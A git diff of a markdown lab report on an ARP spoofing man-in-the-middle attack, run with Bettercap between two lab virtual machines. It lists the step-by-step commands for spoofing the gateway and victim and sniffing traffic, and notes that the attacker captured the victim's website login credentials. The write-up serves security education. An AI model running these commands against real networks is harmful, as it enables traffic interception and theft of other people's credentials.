@@ -4,8 +4,6 @@
 
 BetterCAP is a powerful, flexible and portable tool created to perform various types of MITM attacks against a network, manipulate HTTP, HTTPS and TCP traffic in realtime, sniff for credentials and much more.
 
-![Photo of Mountain](images/mountain.jpg)
-
 ## Attack Setup
 
 This report describes an ARP spoofing attack carried out in a controlled environment using two virtual machines:
@@ -22,6 +20,8 @@ ARP (Address Resolution Protocol) is used to map IP addresses to MAC (hardware) 
 
 ARP Spoofing is an attack where a malicious actor sends falsified ARP messages to a LAN. The attacker associates their MAC address with the IP address of another device (such as the gateway or a target machine), causing traffic to be misdirected.
 
+![](images/body-id101-arp-poisoning.png)
+
 ## Purpose of ARP Spoofing
 
 - Adversary-in-the-Middle (AitM): Intercept, read, or modify traffic.
@@ -35,10 +35,13 @@ ARP Spoofing is an attack where a malicious actor sends falsified ARP messages t
 The following steps were performed using Bettercap on the Kali Linux VM to execute the ARP spoofing attack against the Ubuntu victim machine:
 
    **1. Launch Bettercap**
+
+   
    
  ```bash
  sudo bettercap
 ```
+![](images/1.png)
 
 **2. Enable network discovery modules:**
 
@@ -51,10 +54,22 @@ The following steps were performed using Bettercap on the Kali Linux VM to execu
 ```bash
 net.show
 ```
+![](images/2.png)
+
+192.168.112.99 is the IP address of the attacker's machine.
+
+192.168.112.206 is the IP address of the gateway.
+
+192.168.112.135 is the IP address of the victim's machine.
+
+
 
 **4. Configure ARP spoofing:**
 
+![](images/3.png)
+
 - Set full-duplex mode so that traffic between victim and gateway flows through the attacker:
+
   ```bash
   set arp.spoof.fullduplex true
   ```
@@ -63,6 +78,8 @@ net.show
   ```bash
   set arp.spoof.targets 192.168.112.206, 192.168.112.135
    ```
+
+  
   
 **5. Start the ARP spoofing attack:**
 
@@ -75,7 +92,20 @@ arp.spoof on
 ```bash
 net.sniff on
 ```
+
 This allows the attacker to observe and capture network traffic between the victim and the rest of the network in real-time.
+
+![](images/4.png)
+
+We can see here that the victim visited unicornitems.com
+
+The victim logged on his account on the website.
+
+![Login page on unicornitems.com](images/5.png)
+
+The attacker can see the credentiales entered by the victim
+
+![](images/6.png)
 
 ## Threat Model
 
